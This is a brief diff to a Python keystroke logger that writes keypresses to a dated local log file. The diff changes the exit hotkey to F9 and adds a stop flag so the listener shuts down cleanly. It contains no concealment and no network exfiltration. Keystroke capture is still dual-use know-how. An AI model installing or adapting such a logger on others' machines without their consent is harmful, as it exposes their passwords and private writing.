@@ -6,6 +6,9 @@ import sys
 day = date.today()
 charsperline = 1
 
+listener = ""
+stop = False
+
 logpath = "./logs/"+str(day)+".txt"
 
 
@@ -15,10 +18,13 @@ with open(logpath, "a") as writer:
     currentline = ""
 
     def onkeypress(keyevent):
+        global stop
         try:
-            if keyevent == keyboard.Key.F1:
+            if keyevent == keyboard.Key.f9:
                 print("Close")
                 writer.close()
+                stop = True
+                listener.stop()
                 sys.exit()
 
             global currentcharcount
@@ -40,4 +46,6 @@ with open(logpath, "a") as writer:
     listener.start()
 
     while True:
+        if stop:
+            break
         sleep(1)
